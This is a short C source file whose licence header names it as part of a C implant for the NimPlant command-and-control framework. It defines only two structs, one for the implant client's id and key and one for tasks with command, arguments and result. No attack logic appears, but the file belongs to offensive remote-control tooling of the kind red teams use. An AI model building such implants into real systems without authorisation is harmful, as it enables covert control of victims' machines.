/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * NimPlant client struct.
 */
struct NimPlantClient {
    char* id;
    char* key;
};

/**
 * NimPlant task struct.
 */
struct NimPlantTask {
    char* guid;
    char* command;
    char** arguments;
    int argumentsCount;
    char* result;
};